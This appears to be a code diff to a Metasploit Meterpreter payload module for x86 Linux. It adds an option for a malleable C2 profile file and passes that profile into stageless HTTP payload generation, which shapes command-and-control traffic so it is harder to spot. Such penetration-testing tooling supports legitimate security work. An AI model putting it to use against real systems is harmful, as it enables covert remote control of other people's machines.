@@ -32,11 +32,16 @@ module MetasploitModule
         'Session'       => Msf::Sessions::Meterpreter_x86_Linux
       )
     )
+
+    register_options([
+      OptString.new('MALLEABLEC2', [false, 'Path to a file containing the malleable C2 profile']),
+    ])
   end
 
   def generate(_opts = {})
     opts = {
       scheme: 'http',
+      c2_profile: datastore['MALLEABLEC2'],
       stageless: true
     }.merge(mettle_logging_config)
     payload = MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts)).to_binary :exec
